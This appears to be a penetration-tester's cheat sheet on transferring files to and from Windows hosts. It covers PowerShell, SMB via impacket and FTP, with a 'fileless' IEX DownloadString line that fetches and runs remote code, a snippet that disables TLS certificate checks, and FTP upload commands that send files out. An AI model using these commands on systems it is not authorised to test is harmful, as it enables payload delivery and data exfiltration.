# **WINDOWS FILE TRANSFER**

> [→ Prepping Linux](CHEATSHEETS/FILE_TRANSFER/WINDOWS/prepping_linux.md)
## Powershell Download

> ### DownloadFile
>
>     (New-Object Net.WebClient).DownloadFile('<URI>','<OUTPUT_FILE>')

> ### DownloadFileAsync
>
>     (New-Object Net.WebClient).DownloadFileAsync('<URI>', '<OUTPUT_FILE>')

> ### DownloadString - Fileless
>
>     IEX (New-Object Net.WebClient).DownloadString('<URI>')

> ### Invoke-WebRequest
>
>     Invoke-WebRequest <URI> -OutFile <OUTPUT_FILE>

> ### curl
>
>     curl -O <URI>

> ### Common PowerShell Errors
>
> - If:
>
>```
>Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet >Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
>At line:1 char:1
>+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
>+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
>```
>
> - Specify -UseBasicParsing:
> ```
>  Invoke-WebRequest <URI> -OutFile <OUTPUT_FILE> -UseBasicParsing
>```
>
> - If:
>
>```
>Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
>relationship for the SSL/TLS secure channel."
>At line:1 char:1
>+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
>    + FullyQualifiedErrorId : WebException
>```
>
> - Run:
> ```
> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
>```



## Copy from SMB Server

> ### Copy
>
>     copy \\<IP>\share\<FILE>

> ### Authenticated
>
>     sudo impacket-smbserver share -smb2support <DIRECTORY> -user test -password test







## Download from an FTP Server

> ### Command
>
>     (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<FILE>', '<OUTPUT_FILE>')

> ### Command File
>
>``` 
>echo open <IP> > ftpcommand.txt; echo USER anonymous >> ftpcommand.txt; echo binary >> ftpcommand.txt; echo GET <FILE> >> ftpcommand.txt; echo bye >> ftpcommand.txt; ftp -v -n -s:ftpcommand.txt
>```

## Upload to an FTP Server

> ### Command
>
>     (New-Object Net.WebClient).UploadFile('ftp://<IP>/<OUTPUT_FILE>', '<FILE>')

> ### Command File
>
>``` 
>echo open <IP> > ftpcommand.txt; echo USER anonymous >> ftpcommand.txt; echo binary >> ftpcommand.txt; echo PUT <FILE> >> ftpcommand.txt; echo <OUTPUT_FILE> >> ftpcommand.txt; ftp -v -n -s:ftpcommand.txt
>```